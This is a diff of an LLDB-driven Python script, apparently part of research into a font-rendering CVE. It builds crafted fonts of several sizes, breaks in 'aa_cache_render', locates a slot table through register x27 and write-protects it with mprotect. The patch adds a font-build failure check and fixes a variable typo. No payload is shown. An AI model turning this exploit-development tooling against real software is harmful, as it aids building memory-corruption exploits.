@@ -81,9 +81,11 @@ def find_table(p, x27):
     return best, bestn, bestoff
 
 LS = [30400 + 64*i for i in range(12)]
-subprocess.run(['./venv/bin/python', os.path.join(CVE, 'gen_kN.py')] + [str(L) for L in LS],
-               cwd=CVE, capture_output=True)
-T("A font built Ls=%s" % LS)
+r = subprocess.run(['./venv/bin/python', os.path.join(CVE, 'gen_kN.py')] + [str(L) for L in LS],
+               cwd=CVE, capture_output=True, text=True)
+T("A font built rc=%d %s%s" % (r.returncode, r.stdout[-200:] if r.stdout else '', r.stderr[-300:] if r.returncode else ''))
+if r.returncode != 0:
+    T("RIP-26 ABORT: font build failed"); TRACE.close(); sys.exit(1)
 
 fresh()
 be = t.BreakpointCreateByName("aa_cache_render"); be.SetOneShot(True)
@@ -193,7 +195,7 @@ if p and p.IsValid():
             if x27b == 0:
                 x27b = fr.FindRegister("x27").GetValueAsUnsigned()
                 tp2, n2, soff2 = find_table(p, x27b)
-                if tp2 and soff >= 0:
+                if tp2 and soff2 >= 0:
                     slot_lo2 = tp2 + soff2; slot_hi2 = slot_lo2 + 0xC0
                     T("B x27=%x slots=[%x..%x]" % (x27b, slot_lo2, slot_hi2))
                     v = t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 1)' % (tp2 & ~0xFFF))
